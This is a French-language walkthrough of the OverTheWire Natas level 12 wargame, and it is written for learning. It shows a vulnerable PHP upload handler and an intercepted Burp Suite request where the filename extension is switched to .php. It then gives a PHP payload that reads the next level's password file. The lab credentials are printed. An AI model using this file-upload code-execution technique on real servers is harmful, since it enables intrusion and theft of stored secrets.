username : natas12
password : yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB


- On a un champ d'upload avec le code php : 
```php
<?php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
``` 

- On comprend que lorsque l'on va upload le fichier l'extension .jpg sera rajouté.
- J'essaye dans un premier temps d'upload un fichier php et d'intercepter la requete :
```php 
<?php echo "Zinzin"; ?>
```

Lorsque j'intercepte la requete avec Burpsuite je constate que je peux modifier le type du fichier : 

```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------34616238034390402542525393059
Content-Length: 571
Origin: http://natas12.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMjp5WmRrakFZWlJkM1I3dHE3VDVrWE1qTUpsT0lrekRlQg==
Connection: close
Referer: http://natas12.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1

-----------------------------34616238034390402542525393059
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------34616238034390402542525393059
Content-Disposition: form-data; name="filename"

u8lp4y4fr6.jpg  %% <---On peut modifier l'extension ICI
-----------------------------34616238034390402542525393059
Content-Disposition: form-data; name="uploadedfile"; filename="natas12.php"
Content-Type: application/x-php

<?php
$password = file_get_contents('/etc/natas_webpass/natas13');
echo $password;
?>

-----------------------------34616238034390402542525393059--

```

- Je modifie l'extension en .php et j'upload, mon code s'execute.
- Je fais pas le bourrin et je balance pas un reverse shell, je sais que le mdp est dans /etc/natas_webpass/natas13 donc nouveau script php : 

```php 
<?php
$password = file_get_contents('/etc/natas_webpass/natas13');
echo $password;
?>

```

On upload pareil, et Le mot de passe s'affiche : **trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC**
